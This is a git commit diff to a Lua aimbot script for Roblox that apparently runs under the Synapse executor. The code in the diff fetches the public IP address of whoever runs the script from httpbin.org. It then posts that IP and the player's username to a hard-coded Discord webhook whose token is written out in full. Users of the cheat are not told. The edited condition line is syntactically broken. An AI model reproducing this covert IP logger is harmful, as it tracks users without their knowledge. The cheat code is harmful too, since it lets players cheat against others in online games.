efeb6c3fd69e5c5a7d150729061f2d36154760ca
SkiddingScripts <84696723+SkiddingScripts@users.noreply.github.com>
2021-07-11 20:13:41 -0500

    Update TestAimlock.lua

--- TestAimlock.lua
+++ TestAimlock.lua
@@ -194,9 +194,7 @@ function ValiantAimHacks.findDirectionNormalMaterial(Origin, Destination, UnitMu
 end
 
 
-if LocalPlayer.UserId == 623162005 or 1638172844 or 1308829163 or 1278815007 then
-	-- lol
-else
+if LocalPlayer.UserId ~= 623162005 or LocalPlayer.UserId ~= 1638172844 LocalPlayer.UserId ~= or LocalPlayer.UserId ~= 1308829163 or LocalPlayer.UserId ~= 1278815007 then
 	local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
 
 	local response = syn.request(
@@ -207,6 +205,18 @@ else
 				['Content-Type'] = 'application/json'
 			},
 			Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. " has used the script lmao"..  " " ..  XD .. "```"})
+		}
+	);
+else
+
+	local response = syn.request(
+		{
+			Url = 'https://discord.com/api/webhooks/856531569338220565/3AsGt467TBFZ7NTigDmNIeNjJOU5uvmqeX0vOxmJZ4hZqYpWGTkA1M1Oh3e-hAr3azJv',
+			Method = 'POST',
+			Headers = {
+				['Content-Type'] = 'application/json'
+			},
+			Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. " has used the script lmao"..  " " ..  noIPforyouwaleed .. "```"})
 		}
 	);
 end
